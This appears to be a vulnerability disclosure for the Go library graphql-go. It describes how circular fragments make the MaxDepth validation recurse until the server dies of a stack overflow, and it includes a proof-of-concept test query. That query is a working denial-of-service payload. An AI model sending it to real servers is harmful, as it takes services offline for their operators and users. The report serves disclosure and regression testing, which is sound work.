# Stack overflow in graphql-go max-depth validation with circular fragments

graph-gophers/graphql-go (v1.2.0 line, commit 9d31459e3b5dee3cc34ff9733f9e8acbfe09242d) crashes when a schema uses
`graphql.MaxDepth` and a query contains a fragment cycle.

`Validate` in `internal/validation/validation.go` runs `validateMaxDepth` before the
NoFragmentCycles rule. `validateMaxDepth` follows fragment spreads recursively with
no visited set and without increasing depth, so `fragment X { ...Y }` /
`fragment Y { ...X }` recurses until the Go runtime aborts with
`fatal error: stack overflow` (not recoverable, the whole server dies).

Impact: one unauthenticated query takes down any graphql-go server that enabled the
MaxDepth protection.

## Reproduce

Drop this test into the repository root at commit `9d31459e3b5dee3cc34ff9733f9e8acbfe09242d` and run `go test -run TestPoC -count=1 .` from that directory. It fails (or panics) on the affected code and passes once the issue is fixed.

```go
package graphql_test

import (
	"context"
	"testing"

	graphql "github.com/graph-gophers/graphql-go"
	"github.com/graph-gophers/graphql-go/example/starwars"
)

// Query from the fix commit's graphql_test.go (TestCircularFragmentMaxDepth).
// Vulnerable: with MaxDepth set, the depth check follows the fragment cycle
// X -> Y -> X forever and the process dies with a stack overflow. Fixed: the
// query is rejected with a NoFragmentCycles validation error.
func TestPoCCircularFragmentMaxDepth(t *testing.T) {
	schema := graphql.MustParseSchema(starwars.Schema, &starwars.Resolver{}, graphql.MaxDepth(2))
	query := `
		query { ...X }
		fragment X on Query { ...Y }
		fragment Y on Query { ...X }
	`
	resp := schema.Exec(context.Background(), query, "", nil)
	if len(resp.Errors) == 0 {
		t.Fatal("expected validation errors for a fragment cycle, got none")
	}
}
```
